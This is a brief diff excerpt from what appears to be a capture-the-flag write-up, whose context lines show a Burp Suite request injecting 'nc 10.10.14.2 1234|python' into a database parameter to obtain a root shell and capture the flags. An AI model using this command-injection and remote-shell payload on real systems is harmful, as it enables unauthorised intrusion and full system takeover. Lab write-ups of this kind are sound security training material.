@@ -89,3 +89,4 @@ And finally we use Burp Suite to send our exploit:
 `database=queues;nc+10.10.14.2+1234|python`
 
 Which will send any data received from the connection to port 1234 (our Python reverse shell) to the Python interpreter. We need to `ctrl-c` the connection to port 1234 but after doing this we catch a root shell on 9876 which makes it trivial to grab the flags.
+
